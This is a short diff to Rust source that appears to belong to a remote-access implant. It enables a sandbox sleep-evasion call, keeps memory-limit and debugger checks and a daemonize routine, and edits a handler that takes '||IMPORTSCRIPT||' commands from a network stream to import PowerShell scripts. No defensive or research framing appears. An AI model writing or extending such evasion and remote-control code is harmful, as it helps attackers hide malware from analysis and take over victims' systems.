@@ -32,7 +32,7 @@ fn daemonize_process() {
 
 fn main() {
     sandbox::check_memory_limit();
-    // sandbox::sleep_evasion(Duration::from_secs(3600));
+    sandbox::sleep_evasion(Duration::from_secs(1));
     #[cfg(windows)]
     sandbox::check_debugger();
 
@@ -107,7 +107,6 @@ fn main() {
                     } else if command.starts_with("||IMPORTSCRIPT||") {
                         let output = utils::handle_import_psh(
                             stream_to_use,
-                            &command_clone,
                             &mut imported_scripts,
                             shared_secret
                         );
